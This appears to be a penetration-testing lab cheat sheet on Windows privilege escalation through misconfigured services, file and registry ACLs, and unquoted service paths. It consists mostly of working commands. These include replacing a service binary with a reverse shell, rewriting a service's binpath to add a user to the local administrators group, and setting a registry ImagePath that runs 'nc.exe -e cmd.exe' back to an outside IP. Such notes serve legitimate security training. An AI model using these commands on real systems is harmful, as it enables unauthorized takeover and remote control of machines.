## Permissive File System ACLs

**Running SharpUp
```
.\SharpUp.exe audit
```
- Outputs C:\Program Files (x86)\PCProtect\SecurityService.exe
- https://github.com/GhostPack/SharpUp/

**Checking Permissions with icacls
```
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```
- https://ss64.com/nt/icacls.html

**Replacing Service Binary
```
cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
sc start SecurityService
```
- Use msfvenom reverse shell


## Weak Service Permissions

**Reviewing SharpUp Again
```
SharpUp.exe audit
```

**Checking Permissions with AccessChk
```
accesschk.exe /accepteula -quvcw WindscribeService
```
- https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk

**Check Local Admin Group
```
net localgroup administrators
```

**Changing the Service Binary Path
```
sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
```

**Stopping Service
```
sc stop WindscribeService
```

**Starting the Service
```
sc start WindscribeService
```

**Confirming Local Admin Group Addition
```
net localgroup administrators
```


## Weak Service Permissions - Cleanup

**Reverting the Binary Path
```
sc config WindScribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"
```

**Starting the Service Again
```
sc start WindScribeService
```

**Verifying Service is Running
```
sc query WindScribeService
```


## Unquoted Service Path
When a service is installed, the registry configuration specifies a path to the binary that should be executed on service start. If this binary is not encapsulated within quotes, Windows will attempt to locate the binary in different folders.

**Service Binary Path
```
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
```

With a .exe implied, Windows will attempt to load the following potential executables in order on service start:
- C:\Program
- C:\Program Files
- C:\Program Files (x86)\System
- C:\Program Files (X86)\System Explorer\service\SystemExplorerService64

**Querying Service
```
sc qc SystemExplorerHelpService
```
- Does not have quotes around binary path name

If we can create the following, then we can run our malicious exe instead of the legit binary
- C:\Program.exe\
- C:\Program Files (x86)\System.exe

This is difficult because you need administrative privileges to create files in the root folders.

**Searching for Unquoted Service Paths
```
wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```


## Permissive Registry ACLs

**Checking for Weak Service ACLs in Registry
```
accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services
```

**Changing ImagePath with Powershell
```
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
```


## Modifiable Registry Autorun Binary

**Check Startup Programs
```
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
```
